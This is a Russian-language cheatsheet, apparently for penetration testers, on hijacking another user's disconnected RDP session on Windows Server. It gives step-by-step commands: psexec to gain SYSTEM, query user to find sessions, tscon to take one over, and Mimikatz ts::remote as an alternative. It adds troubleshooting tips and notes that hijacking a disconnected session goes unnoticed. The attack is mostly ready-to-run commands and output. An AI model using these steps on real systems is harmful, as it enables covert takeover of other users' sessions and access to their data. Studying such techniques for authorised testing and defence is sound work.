# RDP Hijacking — Cheatsheet

## Что это

Перехват уже существующей RDP сессии другого пользователя, когда он закрыл клиент, но не вышел из системы (сессия осталась в состоянии `Disc` — disconnected).

## Когда работает

| Версия Windows | Можно ли hijack без пароля |
|----------------|---------------------------|
| Windows Server 2016 и старше | ✅ Да (с правами SYSTEM) |
| Windows Server 2019 и новее | ❌ Нет (требуется пароль) |

## Требования

- Права **SYSTEM** на целевой машине
- Наличие отключенной сессии (состояние `Disc`)
- Windows Server 2016 или старше


## Пошаговая атака

### Шаг 1 — Получить SYSTEM права

Способов много, один из простых — psexec:

```cmd
psexec64.exe -s cmd.exe
```

Или:

```cmd
psexec64.exe -s -i cmd.exe
```

### Шаг 2 — Посмотреть активные сессии

```cmd
query user
```

Пример вывода:

```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                      3  Disc            .  4/6/2022 6:51 AM
```

**Что означают состояния:**
| STATE | Значение |
|-------|----------|
| `Active` | Сессия активна (пользователь работает) |
| `Disc` | Отключенная сессия (можно захватить) |

### Шаг 3 — Захватить сессию

Формат команды:
```cmd
tscon ID /dest:ТВОЯ_СЕССИЯ
```

Пример:
```cmd
tscon 3 /dest:rdp-tcp#6
```

**Что произошло:** Сессия пользователя `luke` (ID 3) теперь подключена к твоей RDP сессии (`rdp-tcp#6`).

### Шаг 4 — Результат

Ты мгновенно переключаешься на рабочий стол пользователя `luke`, захватывая его сессию.


## Альтернативные способы

### Через Mimikatz

```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # ts::sessions
mimikatz # ts::remote /id:3
```

### Через `tscon` от SYSTEM (без psexec)

Если у тебя уже есть SYSTEM shell:

```cmd
tscon 3 /dest:console
```

`/dest:console` — подключает сессию к текущей консоли.


## Что делать, если hijack не работает

### Проблема: ошибка 1326 (неверный пароль)

**Причина:** Windows Server 2019+ или недостаточно прав.

**Решение:** Только пароль или другой метод.

### Проблема: нет сессий в состоянии `Disc`

**Решение:** Ждать или попросить пользователя закрыть RDP, не выходя из системы.

### Проблема: нет прав SYSTEM

**Решение:** Получить через psexec, meterpreter, или другой эксплойт.


## Шпаргалка (быстрые команды)

```cmd
# Получить SYSTEM
psexec64.exe -s cmd.exe

# Посмотреть сессии
query user

# Захватить чужую сессию
tscon ID /dest:СВОЯ_СЕССИЯ

# Альтернатива (через Mimikatz)
mimikatz # ts::remote /id:ID
```


## Применение в пентесте

| Ситуация | Что делаем |
|----------|------------|
| Нашли отключенную сессию админа | Захватываем → получаем доступ к его данным |
| Нет прав на захват | Получаем SYSTEM через другой вектор |
| Windows Server 2019+ | Ищем другой способ (не hijack) |


## Важные замечания

- При захвате **активной** сессии пользователь будет выгнан и может это заметить
- Захват **отключенной** сессии (`Disc`) проходит незаметно
- После перезагрузки сервера все отключенные сессии пропадают
- На Windows 10/11 (не Server) hijack тоже возможен, но сложнее
